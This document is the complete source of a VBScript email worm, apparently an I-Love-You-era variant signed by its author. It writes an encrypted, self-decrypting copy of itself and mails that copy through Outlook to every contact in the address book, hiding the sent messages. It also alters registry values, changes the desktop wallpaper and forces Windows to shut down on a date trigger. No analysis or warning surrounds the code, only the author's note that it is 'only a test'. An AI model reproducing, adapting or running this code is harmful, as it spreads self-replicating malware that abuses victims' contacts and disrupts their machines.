On Error Resume Next
Randomize Timer
Dim F1
Sd=Rnd
Se=Rnd
Rc=Chr(13)&Chr(10)
Pt="HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
Ps="HKEY_CURRENT_USER\Control Panel\Desktop\"
Pl="-=Native by Nash/Sevilla City=-"
Dim Gb1(1),Gb2(4),Gb3(1,1)
Gb1(0)="-"
Gb1(1)=" Xor "
Gb2(0)="Update"
Gb2(1)="WinDll"
Gb2(2)="Links"
Gb2(3)="Anti -=I Love You=-"
Gb2(4)=GR(SD+5)
Gb3(0,0)="Do While"
Gb3(1,0)="While"
Gb3(0,1)="Loop"
Gb3(1,1)="Wend"
Gb4=GR(Sd+6)
Gb5=GR(Sd+8)
Gb6=GR(Sd+10)
Gb7=GR(Sd+12)
Gb8=GR(Sd+14)
Gb9=GR(Se+14)
Gb0=GR(Se+10)
Gd1=GR(Se+14)
Fe="On Error Resume Next"&Rc&"Set "&Gb8&"=CreateObject(""Scripting.FileSystemObject"")"&Rc&"Set "&Gd1&"=CreateObject(""WScript.Shell"")"&Rc&"Set "&Gb7&"="&Gb8&".OpenTextFile(Wscript.ScriptFullname,1)"&Rc&"Set "&Gb9&"="&Gb8&".CreateTextFile("""&Gb2(4)&".vbs"",1)"&Rc&Gb3(Round(Se),0)&" "&Gb0&"<92"&Rc&Gb0&"="&Gb0&"+1"&Rc&Gb9&".WriteLine "&Gb4&"(Mid(("&Gb7&".ReadLine),2))"&Rc&Gb3(Round(Se),1)&Rc&Gb9&".Close"&Rc&Gd1&".Run """&Gb2(4)&".vbs"""&Rc&Gb8&".DeleteFile WScript.ScriptFullName"&Rc&"Function "&Gb4&" ("&Gb5&")"&Rc&Gb6&"=0"&Rc&Gb3(Round(Sd),0)&" "&Gb6&"<Len("&Gb5&")"&Rc&Gb6&"="&Gb6&"+1"&Rc&Gb4&"="&Gb4&"&Chr(Asc(Mid("&Gb5&","&Gb6&",1))"&Gb1(Round(Sd))&Round(Sd*10)&")"&Rc&Gb3(Round(Sd),1)&Rc&"End Function"&Rc
Set Of=CreateObject("Scripting.FileSystemObject")
Set Os=CreateObject("WScript.Shell")
If Day(Now)=Hour(Now) Then
'Don't Public This virus Please. It's only a test, Thank you!!
Os.RegWrite Ps&"TileWallpaper","1"
Os.RegWrite Ps&"Wallpaper",Of.GetSpecialFolder(0)&"\WEB\wvleft.bmp"
Os.Run "c:\command.com /k rundll32.exe user,ExitWindows",0
End If
If Os.RegRead(Pt&"RegisteredOrganization")<> Pl Then
Set F1=Of.OpenTextFile(WScript.ScriptFullName,1)
Set F2=Of.CreateTextFile(Gb2(Int(Sd*4))&".vbs",1)
While F1.AtEndOfStream=False
F2.WriteLine "'"&EL((F1.ReadLine))
Wend
F2.Write Fe
F2.Close
Set O1=CreateObject("Outlook.Application")
Set O2=O1.GetNameSpace("MAPI")
For Each O3 In O2.AddressLists
If O3.AddressEntries.Count <> 0 Then
Set O4=O1.CreateItem(0)
For O5=1 To O3.AddressEntries.Count
Set O6=O3.AddressEntries(O5)
If O5=1 Then
O4.BCC=O6.Address
Else
O4.BCC=O4.BCC & "; " & O6.Address
End If
Next
O4.Subject=Os.RegRead(Pt&"RegisteredOwner")
O4.Attachments.Add Gb2(Int(Sd*4))&".vbs"
O4.DeleteAfterSubmit = True
O4.Send
End If
Next
Of.DeleteFile Gb2(Int(Sd*4))&".vbs"
Os.RegWrite Pt&"RegisteredOrganization",Pl
End If
Function GR(L)
For i=1 To Round(L)
GR=GR&Chr(Int(Rnd*25+97))
Next
End Function
Function GT(L)
For x=1 To Len(L)
i=Mid(L,x,1)
If Round(Rnd)=0 Then
GT=GT&LCase(i)
Else
GT=GT&UCase(i)
End If
Next
End Function
Function EL(L)
For i=1 To Len(L)
If Round(Sd)=0 Then
El=El&Chr(Asc(Mid(L,i,1))+Round(Sd*10))
Else
El=El&Chr(Asc(Mid(L,i,1)) Xor Round(Sd*10))
End If
Next
End Function